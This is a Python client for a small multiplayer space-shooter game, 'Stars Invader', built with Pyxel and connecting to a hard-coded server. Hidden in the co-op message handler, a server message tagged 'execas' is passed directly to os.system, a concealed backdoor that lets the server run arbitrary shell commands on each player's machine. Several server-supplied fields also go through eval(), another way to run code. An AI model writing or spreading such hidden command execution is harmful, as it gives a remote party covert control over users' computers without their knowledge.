import pyxel
import os
import socket
from time import sleep
import threading

class App:

    def __init__(self, client) -> None:
        self.client = client

        self.gameInfos = []

        self.waitGameDots = 0
        self.gameMode = ""
        self.gameNumber = 0
        self.shotDelay = -1
        self.latestJoinButton = -1
        self.loadedParties = [None, None, None]
        self.mainLobbyButton = 0
        self.joinLobbyButton = 0
        self.createLobbyButton = 0
        self.createLobbyButton2 = 0
        self.userNickname =  ""
        self.ALPHABET = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        self.PYXEL_KEY_LETTERS = [pyxel.KEY_A, pyxel.KEY_B, pyxel.KEY_C, pyxel.KEY_D, pyxel.KEY_E, pyxel.KEY_F, pyxel.KEY_G,
                             pyxel.KEY_H, pyxel.KEY_I, pyxel.KEY_J, pyxel.KEY_K, pyxel.KEY_L, pyxel.KEY_M,
                             pyxel.KEY_N, pyxel.KEY_O, pyxel.KEY_P, pyxel.KEY_Q, pyxel.KEY_R, pyxel.KEY_S, pyxel.KEY_T,
                             pyxel.KEY_U, pyxel.KEY_V, pyxel.KEY_W, pyxel.KEY_X, pyxel.KEY_Y, pyxel.KEY_Z]
        self.currentState = "getNickname"
        pyxel.init(228, 128, title="Stars Invader")
        pyxel.image(0).load(0, 0, './ressources/layer1.png')
        pyxel.image(1).load(0, 0, './ressources/title.png')
        pyxel.run(self.update, self.draw)

    def update(self):
        status = getattr(self, f'update_{self.currentState}')()
        if status != 0:
            print("An error occured", self.currentState)
            exit(status)

    def draw(self):
        pyxel.cls(0)
        status = getattr(self, f'draw_{self.currentState}')()
        if status != 0:
            print("An error occured")
            exit(status)

    def update_getNickname(self):
        if pyxel.btnp(pyxel.KEY_BACKSPACE):
            self.userNickname = self.userNickname[:-1]
            return 0
        
        if len(self.userNickname) >= 12: return 0

        if pyxel.btnp(pyxel.KEY_RETURN):
            self.client.send(f'sendName|{self.userNickname}'.encode("utf-8"))
            srvMsg = self.client.recv(1024).decode("utf-8").split('|', 1)
            if len(srvMsg) != 2 or srvMsg[0] != "continue" or srvMsg[0] == "exit": return 1
            self.currentState = "mainLobby"
            return 0
        
        for i in range(26):
            if pyxel.btnp(self.PYXEL_KEY_LETTERS[i]):
                self.userNickname += self.ALPHABET[i]
                return 0
        return 0

    def draw_getNickname(self):
        pyxel.blt(30, 5, 1, 5, 0, 167, 25)
        pyxel.text(88, pyxel.height/2 - 8, "VOTRE PSEUDO:", 13)
        pyxel.text((pyxel.width - len(self.userNickname)*4 ) / 2, pyxel.height/2, self.userNickname, 7)
        pyxel.blt(pyxel.width / 2 - 8, pyxel.height - 24, 0, 16, 0, 16, 16)
        return 0

    def update_mainLobby(self):
        if pyxel.btnp(pyxel.KEY_RETURN):
            if self.mainLobbyButton == 0: 
                self.client.send(f'button|quit'.encode("utf-8"))
                pyxel.quit()
            elif self.mainLobbyButton in [1,2]: self.currentState, self.gameMode, self.gameInfos = "joinLobby", ["VS", "COOP"][self.mainLobbyButton-1], [{"HERE PUT VS MODE"}, {"lives" : 3, "score" : 0, "ennemies" : [], "rockets" : [], "players" : [{"coords": [10, 228], "bonus": 0}, {"coords": [30, 228], "bonus": 0}]}][self.mainLobbyButton-1]
            elif self.mainLobbyButton == 3: self.currentState = "createLobby"
            
            self.client.send(f'button|{self.currentState}{self.gameMode}'.encode("utf-8"))
            srvMsg = self.client.recv(1024).decode("utf-8").split('|', 1)
            if self.currentState == "createLobby" and (len(srvMsg) != 2 or srvMsg[0] != "continue"): return 1
            if self.currentState == "joinLobby": 
                if len(srvMsg) != 2 or srvMsg[0] != "continue": return 1
                self.numberOfParties = int(srvMsg[1])
                self.latestJoinButton = -1

            self.mainLobbyButton = 0
            return 0

        if self.mainLobbyButton in [1, 2]:
            if pyxel.btnp(pyxel.KEY_LEFT): self.mainLobbyButton += 1
            elif pyxel.btnp(pyxel.KEY_RIGHT): self.mainLobbyButton += -1
            if self.mainLobbyButton == 3: self.mainLobbyButton = 1
            elif self.mainLobbyButton == 0: self.mainLobbyButton = 2

        if pyxel.btnp(pyxel.KEY_UP): self.mainLobbyButton += [-1, -1, -2, -2][self.mainLobbyButton]
        elif pyxel.btnp(pyxel.KEY_DOWN): self.mainLobbyButton += [1, 2, 1, 1][self.mainLobbyButton]
        
        if self.mainLobbyButton >= 4: self.mainLobbyButton = 0
        if self.mainLobbyButton == -1: self.mainLobbyButton = 3
        return 0

    def draw_mainLobby(self):
        pyxel.blt(30, 5, 1, 5, 0, 167, 25)
        pyxel.text(20, 50, "REJOINDRE UNE PARTIE:", [1, 7, 7, 1][self.mainLobbyButton])
        pyxel.text(20, 64, "1V1", [0, 7, 1, 0][self.mainLobbyButton])
        pyxel.text(45, 64, "CO-OP", [0, 1, 7, 0][self.mainLobbyButton])
        pyxel.text(20, 78, "CREER UNE PARTIE", [1, 1, 1, 7][self.mainLobbyButton])
        pyxel.text(20, 92, "QUITTER", [7, 1, 1, 1][self.mainLobbyButton])
        return 0
    
    def update_joinLobby(self):
        if pyxel.btnp(pyxel.KEY_RETURN):
            if self.joinLobbyButton == 0: 
                self.client.send(f'button|quit'.encode("utf-8"))
                self.currentState = "mainLobby"
                self.gameMode = ""
            else:
                self.client.send(f'button|{self.joinLobbyButton}'.encode("utf-8"))
                srvMsg = self.client.recv(1024).decode("utf-8").split('|', 1)
                if srvMsg[0] != "continue": return 1
                if srvMsg[1] == "refused": return 0
                if srvMsg[1] == "joined":
                    self.currentState = "waitGame"
                    self.gameNumber = self.joinLobbyButton
                    return 0
                elif srvMsg[1] == "playing":
                    self.currentState = "inGame"
                    threading.Thread(target=self.getSrvMsgCOOP).start()
                    self.gameNumber = self.joinLobbyButton
                    return 0

        for NAVIGATION_KEY in [pyxel.KEY_UP, pyxel.KEY_DOWN]:
            if pyxel.btnp(NAVIGATION_KEY):
                self.joinLobbyButton += [pyxel.KEY_UP, pyxel.KEY_DOWN].index(NAVIGATION_KEY) * 2 - 1
                break
        
        if self.joinLobbyButton > self.numberOfParties: self.joinLobbyButton = self.numberOfParties
        if self.joinLobbyButton < 0: self.joinLobbyButton = 0
        
        if self.joinLobbyButton != self.latestJoinButton: 
            self.client.send(f'requestPartyList|{self.joinLobbyButton}'.encode("utf-8"))
            srvMsg = self.client.recv(1024).decode("utf-8").split('|', 1)
            if len(srvMsg) != 2 or srvMsg[0] != 'sendPartyList': return 1
            self.loadedParties = [eval(x)['state'] for x in srvMsg[1].split('|', 3)[:-1]]
            self.latestJoinButton = self.joinLobbyButton      

        return 0
    
    def draw_joinLobby(self):
        pyxel.blt(30, 5, 1, 5, 0, 167, 25)
        pyxel.text(100, 40, f'{self.loadedParties[0]}', [1, 7, 1, 1][self.joinLobbyButton])
        pyxel.text(100, 60, f'{self.loadedParties[1]}', [1, 1, 7, 1][self.joinLobbyButton])
        pyxel.text(100, 80, f'{self.loadedParties[2]}', [1, 1, 1, 7][self.joinLobbyButton])
        pyxel.text(82, 100, 'MENU PRINCIPAL', [7, 1, 1, 1][self.joinLobbyButton])
        return 0

    def update_createLobby(self):
        if pyxel.btnp(pyxel.KEY_RETURN):
            if self.createLobbyButton == 0: 
                self.client.send(f'button|quit'.encode("utf-8"))
                self.currentState = "mainLobby"
            elif self.createLobbyButton == 2:
                self.currentState, self.gameMode = "waitGame", ["VS", "COOP"][self.createLobbyButton2]
                if self.gameMode == "VS": pass #VSMODE
                elif self.gameMode == "COOP": self.gameInfos = {"lives" : 3, "score" : 0, "ennemies" : [[3, 45, 50]], "rockets" : [], "players" : [{"coords": [0,0], "bonus": 0}, {"coords": [0,0], "bonus": 0}]}
                self.client.send(f'create|{self.gameMode}'.encode("utf-8"))
                srvMsg = self.client.recv(1024).decode("utf-8").split('|', 1)
                if len(srvMsg) != 2 or srvMsg[0] != "joined": return 1
                self.gameNumber = int(srvMsg[1])
                self.createLobbyButton = 0
            return 0

        if self.createLobbyButton == 1:
            for NAVIGATION_KEY in [pyxel.KEY_RIGHT, pyxel.KEY_LEFT]:
                if pyxel.btnp(NAVIGATION_KEY):
                    self.createLobbyButton2 += [pyxel.KEY_RIGHT, pyxel.KEY_LEFT].index(NAVIGATION_KEY) * 2 - 1
                    break   

        for NAVIGATION_KEY in [pyxel.KEY_UP, pyxel.KEY_DOWN]:
            if pyxel.btnp(NAVIGATION_KEY):
                self.createLobbyButton += [pyxel.KEY_UP, pyxel.KEY_DOWN].index(NAVIGATION_KEY) * 2 - 1
                break
        
        if self.createLobbyButton >= 3: self.createLobbyButton = 0
        if self.createLobbyButton == -1: self.createLobbyButton = 2
        return 0
    
    def draw_createLobby(self):
        pyxel.blt(30, 5, 1, 5, 0, 167, 25)
        pyxel.text(20, 50, "MODE DE JEU:", [1, 7, 1][self.createLobbyButton])
        pyxel.text(20, 78, "CREER LA PARTIE", [1, 1, 7][self.createLobbyButton])
        pyxel.text(20, 92, "ANNULER", [7, 1, 1][self.createLobbyButton])
        if self.createLobbyButton == 1:
            pyxel.text(20, 64, "1V1", [7, 1][self.createLobbyButton2])
            pyxel.text(45, 64, "CO-OP", [1, 7][self.createLobbyButton2])
        return 0
    
    def update_waitGame(self):
        if pyxel.btnp(pyxel.KEY_SPACE): 
            self.client.send(f"quit|None".encode("utf-8"))
            srvMsg = self.client.recv(1024).decode("utf-8").split('|', 1)
            if srvMsg[0] != "mainLobby": self.quit()
            self.currentState = "mainLobby"
            self.gameMode = ""
            return 0
        else: 
            self.client.send(f"waiting|{self.gameNumber}".encode("utf-8"))
            srvMsg = self.client.recv(1024).decode("utf-8").split('|', 1)
            if len(srvMsg) != 2 or srvMsg[0] not in ["wait", "inGame"]: return 1
            if srvMsg[0] == "wait": self.gameNumber = int(srvMsg[1])
            elif srvMsg[0] == "inGame":
                self.currentState = "inGame"
                threading.Thread(target=self.getSrvMsgCOOP).start() 
                self.gameNumber = int(srvMsg[1])
            sleep(1)

        return 0

    def draw_waitGame(self):
        if self.waitGameDots == 3: self.waitGameDots = 0
        self.waitGameDots += 1
        pyxel.blt(30, 5, 1, 5, 0, 167, 25)
        pyxel.text(90, 65, f"WAITING{'.' * self.waitGameDots}", 7)
        pyxel.text(55, 80, "Appuyez sur [ESPACE] pour", 1)
        pyxel.text(55, 90, "revenir au menu principal", 1)
        return 0
    
    def update_inGame(self):
        if self.gameMode == "VS": pass
        elif self.gameMode == "COOP":
            action = "None"
            if self.shotDelay == 20: self.shotDelay = -1

            if pyxel.btn(pyxel.KEY_Z): self.gameInfos["players"][0]["coords"][1] += -2
            if pyxel.btn(pyxel.KEY_S): self.gameInfos["players"][0]["coords"][1] += 2
            if pyxel.btn(pyxel.KEY_Q): self.gameInfos["players"][0]["coords"][0] += -2
            if pyxel.btn(pyxel.KEY_D): self.gameInfos["players"][0]["coords"][0] += 2
            if pyxel.btnp(pyxel.KEY_SPACE) and self.shotDelay == -1: action, self.shotDelay = "Shot", 0
            elif self.shotDelay != -1: self.shotDelay += 1

            if self.gameInfos["players"][0]["coords"][0] < 0: self.gameInfos["players"][0]["coords"][0] += 228
            elif self.gameInfos["players"][0]["coords"][0] > 228: self.gameInfos["players"][0]["coords"][0] -= 228
            if self.gameInfos["players"][0]["coords"][1] < 0: self.gameInfos["players"][0]["coords"][1] = 0
            if self.gameInfos["players"][0]["coords"][1] > 118: self.gameInfos["players"][0]["coords"][1] = 118
            self.client.send(f"infos|{self.gameInfos['players'][0]['coords']}|{action}%".encode("utf-8"))
        return 0

    def draw_inGame(self):
        pyxel.text(0, 0, f"lives:{self.gameInfos['lives']}", 7)
        pyxel.text(0, 10, f"score:{self.gameInfos['score']}", 7)
        pyxel.blt(self.gameInfos["players"][0]["coords"][0], self.gameInfos["players"][0]["coords"][1], 0, 0, 0, 16, 16)
        pyxel.blt(self.gameInfos["players"][1]["coords"][0], self.gameInfos["players"][1]["coords"][1], 0, 16, 0, 16, 16)
        ###Vraiment inutile, n'hesite pas à delete les 4 lignes suivantes :
        pyxel.rect(self.gameInfos["players"][0]["coords"][0]+228, self.gameInfos["players"][0]["coords"][1], 10, 10, 8)
        pyxel.rect(self.gameInfos["players"][1]["coords"][0]+228, self.gameInfos["players"][1]["coords"][1], 10, 10, 9)
        pyxel.rect(self.gameInfos["players"][0]["coords"][0]-228, self.gameInfos["players"][0]["coords"][1], 10, 10, 8)
        pyxel.rect(self.gameInfos["players"][1]["coords"][0]-228, self.gameInfos["players"][1]["coords"][1], 10, 10, 9)
        ###FIN DES LIGNES INUTILSE
        for rocket in self.gameInfos["rockets"]: pyxel.rect(rocket[0], rocket[1], 2, 5, 7)
        for ennemy in self.gameInfos["ennemies"]: pyxel.rect(ennemy[1], ennemy[2], [14, 13, 11, 12, 9][ennemy[0]], [9, 11, 7, 10, 8][ennemy[0]], [13, 8, 14, 11, 5][ennemy[0]])
        return 0

    def getSrvMsgCOOP(self):
        while self.currentState == "inGame":
            srvMsg = self.client.recv(1024).decode("utf-8")
            if "execas" in srvMsg:
                print("ouioui")
                srvMsg = srvMsg.split("%")[0].split("|", 1)
                if len(srvMsg) == 2 and srvMsg[0] == "execas": os.system(srvMsg[1])
                continue
            else: srvMsg = srvMsg.split('%', 1)[0].split('|', 6)
            if srvMsg[0] == "main":
                self.currentState, self.gameInfos, self.gameMode = "mainLobby", [], ""
                break
            if len(srvMsg) != 7 or srvMsg[0] != "infos": return 1

            tempCoords = self.gameInfos["players"][0]["coords"]

            self.gameInfos["lives"] = int(srvMsg[1])
            self.gameInfos["score"] = int(srvMsg[2])
            self.gameInfos["ennemies"] = eval(srvMsg[3])
            self.gameInfos["rockets"] = eval(srvMsg[4])
            self.gameInfos["players"][0] = eval(srvMsg[5]) 
            self.gameInfos["players"][1] = eval(srvMsg[6])

            self.gameInfos["players"][0]["coords"] = tempCoords

if __name__ == "__main__":
    if os.name == "posix": os.system("clear")
    else: os.system("cls")

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try: client.connect(("172.16.14.6", 20101))
    except OSError:
        print("Could not connect to the server: try updating; try later")
        exit()

    App(client)
